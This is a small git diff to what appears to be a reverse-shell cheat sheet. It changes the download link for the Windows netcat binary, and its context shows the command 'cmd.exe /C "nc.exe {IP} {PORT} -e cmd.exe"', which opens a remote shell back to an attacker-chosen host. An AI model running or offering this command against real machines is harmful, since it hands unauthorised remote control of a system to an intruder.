@@ -53,8 +53,8 @@ Now you should have a complete shell with shortcuts available.
 
 ### Windows
 
-Upload [`nc.exe`](/assets/nc.exe) (or [`nc64.exe`](/assets/nc64.exe)) on the
-remote server then use the command (same as [NetCat](#netcat)):
+Upload [`nc.exe`](https://eternallybored.org/misc/netcat/) on the remote server
+then use the command (same as [NetCat](#netcat)):
 
 ```bash
 cmd.exe /C "nc.exe {IP} {PORT} -e cmd.exe"
